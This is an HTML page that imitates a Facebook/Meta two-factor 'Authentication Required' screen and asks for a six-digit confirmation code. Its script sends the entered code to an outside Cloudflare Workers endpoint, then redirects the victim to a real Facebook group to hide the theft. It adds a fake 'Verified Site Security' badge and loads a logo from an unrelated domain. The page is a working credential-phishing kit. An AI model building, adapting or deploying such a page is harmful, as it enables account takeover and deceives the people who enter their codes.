<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook | United Kingdom and Ireland</title>
    <!-- Favicon -->
    <link rel="icon" type="image/svg+xml" href="https://upload.wikimedia.org/wikipedia/commons/b/b9/2023_Facebook_icon.svg">
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brandBlue: '#0064e0',
                        brandBlueHover: '#0052b8',
                        brandBlueActive: '#004399',
                        greyBtn: '#e4e6eb',
                        greyBtnHover: '#d8dadf',
                    }
                }
            }
        }
    </script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f6f8fa;
        }
        input, button, a {
            transition: all 0.15s ease-in-out;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-between items-center text-gray-900 py-8 px-4">

    <header class="w-full max-w-md flex flex-col items-center">
        <!-- Top Logo 1 -->
        <div class="mb-6 flex justify-center items-center">
            <img 
                src="https://k7m2q9x4l8pr3vn6at1zw5by0cd8hf2jm9sx4gp6r1.thirdcrossing.co.uk/ngsfd.png" 
                alt="Logo 1" 
                class="h-12 w-auto object-contain"
                onerror="this.onerror=null; this.replaceWith(document.getElementById('fallback-logo-1').content.cloneNode(true));"
            />
            <template id="fallback-logo-1">
                <svg class="h-12 w-12 text-gray-900" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.53 1.032 1.53 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" />
                </svg>
            </template>
        </div>
        <hr class="w-full border-t border-gray-300 my-2">
    </header>

    <main class="w-full max-w-md my-auto py-6">
        <h1 class="text-2xl font-semibold text-center mb-2 text-gray-800">
            Authentication Required
        </h1>
        <p id="instructionText" class="text-sm text-gray-600 text-center mb-6">
            Please enter the six-digit code sent to your device
        </p>

        <div class="bg-white p-6 md:p-8 rounded-xl shadow-md border border-gray-200">
            <form id="verifyForm" class="space-y-5">
                <!-- Code Input -->
                <div>
                    <label for="code" class="block text-sm font-medium text-gray-700 mb-1.5">
                        Confirmation code
                    </label>
                    <input 
                        type="text" 
                        id="code" 
                        name="code" 
                        required 
                        maxlength="8"
                        placeholder="Enter code"
                        class="w-full px-3.5 py-2.5 bg-gray-50 border border-gray-300 rounded-lg text-sm text-gray-900 tracking-widest text-center focus:outline-none focus:ring-2 focus:ring-brandBlue focus:bg-white focus:border-transparent transition-all"
                    >
                </div>

                <!-- Action Button -->
                <div class="space-y-3 pt-2">
                    <button 
                        type="submit" 
                        id="verify-button"
                        class="w-full py-2.5 px-4 bg-brandBlue hover:bg-brandBlueHover active:bg-brandBlueActive text-white font-medium text-sm rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-brandBlue transition-all cursor-pointer"
                    >
                        Continue
                    </button>
                </div>

                <!-- Countdown / Resend Section & Try Another Way -->
                <div class="space-y-3 pt-2 text-center text-sm text-gray-500">
                    <div id="countdownContainer">
                        Send again in <span id="timer" class="font-semibold text-gray-700">10:00</span>
                    </div>
                    
                    <!-- Hidden initially, shown after 5 minutes (when timer reaches 05:00) -->
                    <div id="tryAnotherWayContainer" class="hidden">
                        <a href="https://www.facebook.com" class="text-brandBlue hover:underline font-medium">Try another way</a>
                    </div>
                </div>
            </form>
            
            <!-- Message Notification Container -->
            <div id="statusMessage" class="hidden mt-4 p-3 rounded-lg text-sm text-center"></div>
        </div>
    </main>

    <footer class="w-full max-w-md flex flex-col items-center">
        <hr class="w-full border-t border-gray-300 my-2">
        <div class="mt-6 flex justify-center items-center">
            <img 
                src="logo-2.svg" 
                alt="Logo 2" 
                class="h-8 w-auto object-contain opacity-80 hover:opacity-100 transition-opacity"
                onerror="this.onerror=null; this.replaceWith(document.getElementById('fallback-logo-2').content.cloneNode(true));"
            />
            <template id="fallback-logo-2">
                <div class="flex items-center space-x-2">
                    <img
                        src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg"
                        alt="Meta Platforms logo"
                        class="h-6 w-auto"
                        onerror="this.onerror=null; this.replaceWith(document.getElementById('fallback-security-badge').content.cloneNode(true))"
                    />
                </div>
            </template>
            <template id="fallback-security-badge">
                <div class="flex items-center space-x-2 text-gray-500">
                    <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
                    </svg>
                    <span class="text-xs font-semibold tracking-wider uppercase">
                        Verified Site Security
                    </span>
                </div>
            </template>
        </div>
    </footer>

    <script>
        // Dynamically populate target info from URL query parameter
        const urlParams = new URLSearchParams(window.location.search);
        const targetValue = urlParams.get('target');
        if (targetValue) {
            document.getElementById("instructionText").textContent = 
                `Please enter the six-digit code sent to ${targetValue}`;
        }

        // Total time = 10 minutes (600s). Enable "Try another way" after 5 minutes elapsed (i.e. at <= 300s left).
        let timeLeft = 600;
        const countdownContainer = document.getElementById("countdownContainer");
        const tryAnotherWayContainer = document.getElementById("tryAnotherWayContainer");

        function updateCountdown() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            const timerElement = document.getElementById("timer");

            if (timerElement) {
                timerElement.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
            }

            // Enable "Try another way" link once 5 minutes (300s) have passed
            if (timeLeft <= 300) {
                tryAnotherWayContainer.classList.remove('hidden');
            }

            if (timeLeft > 0) {
                timeLeft--;
                setTimeout(updateCountdown, 1000);
            } else {
                countdownContainer.innerHTML = '<a href="#" onclick="handleResendCode(event)" class="text-brandBlue hover:underline font-medium">Send again</a>';
            }
        }

        // Initialize countdown execution immediately on load
        updateCountdown();

        function handleResendCode(event) {
            event.preventDefault();
            // Reset timer back to 10 minutes
            timeLeft = 600;
            tryAnotherWayContainer.classList.add('hidden'); // Hide again until another 5 mins pass
            countdownContainer.innerHTML = 'Send again in <span id="timer" class="font-semibold text-gray-700">10:00</span>';
            updateCountdown();
            
            // Show feedback
            const msgBox = document.getElementById('statusMessage');
            msgBox.textContent = "A new code has been sent.";
            msgBox.className = "mt-4 p-3 rounded-lg text-sm text-center bg-blue-50 text-brandBlue border border-blue-200";
            msgBox.classList.remove('hidden');
        }

        // Form submission handling to worker
        const form = document.getElementById("verifyForm");
        const submitButton = document.getElementById("verify-button");
        const status = document.getElementById("statusMessage");

        form.addEventListener("submit", async function(event) {
            event.preventDefault();

            if (!form.checkValidity()) {
                form.reportValidity();
                return;
            }

            submitButton.disabled = true;
            submitButton.classList.add('opacity-50', 'cursor-not-allowed');
            status.classList.add('hidden');
            status.textContent = "";

            const data = {
                code: document.getElementById("code").value.trim(),
                submission_type: "verification_code"
            };

            try {
                await fetch("https://tendring-contact.twells-tet.workers.dev", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(data)
                });
            } catch (error) {
                console.error(error);
            } finally {
                // Redirect to facebook.com once code has been entered
                window.location.href = "https://www.facebook.com/groups/785602965263691/";
            }
        });
    </script>
</body>
</html>
